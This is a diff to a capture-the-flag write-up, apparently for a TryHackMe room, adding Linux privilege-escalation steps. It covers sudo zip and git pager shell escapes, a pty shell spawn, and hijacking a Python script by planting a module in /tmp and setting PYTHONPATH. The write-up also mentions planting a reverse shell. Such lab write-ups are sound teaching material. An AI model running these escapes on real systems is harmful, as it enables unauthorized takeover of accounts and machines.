@@ -109,7 +109,7 @@ So, the **first** thing is to find where the script is, there are two ways:
 lets search for it by the `find` command by searching for all the files that `Viktor` owns, and the `47.sh` is the target file.
 
 ```bash
-find / -user viktor 2>dev/null | grep .sh
+find / -user viktor 2>/dev/null | grep .sh
 ```
 
 Now lets put the `bash` reverse shell script in the file, which you can get from: [GTFobins](https://gtfobins.github.io/gtfobins/bash/)
@@ -165,6 +165,11 @@ TF=$(mktemp -u)
 sudo -u silvio /usr/bin/zip $TF /etc/hosts -T -TT 'sh #'
 rm $TF
 ```
+Now get a good shell...
+```bash
+python -c 'import pty;pty.spawn("/bin/bash")
+```
+
 and get your flag....
 
 **a fast note, the hint on `THM` says "Check the Postal Code on the address." it means the `zip` command , very silly ain't it ?!**
@@ -178,3 +183,15 @@ sudo -u reza PAGER='sh -c "exec sh 0<&1"' git -p help
 ``` 
 
 ---
+####  Jordan's Flag
+
+Check the permissions of Reza with `sudo -l`, you will see that there is a permission on a `python` file that `Reza` can run it as `Jordan`, so as it became usual let's go to [GTFobins](https://gtfobins.github.io/gtfobins/bash/) to get a shell code from there, but wait, the file can't find a module called `shop.py` so we can write a module with that name and put the exploit code we want in it and then run the file again.
+
+The exploit writed in a python script we will use as the missing module.
+```bash
+echo "import pty;pty.spawn('/bin/bash')" > /tmp/shop.py
+```
+And now we need to redirect the script to run our module, we can do that by changing the environment variable called `PYTHONPATH`, and by changing it to the path of our written module we can do the evil thing 😈.
+```bash
+sudo -u jordan PYTHONPATH=/tmp/ script.py
+```
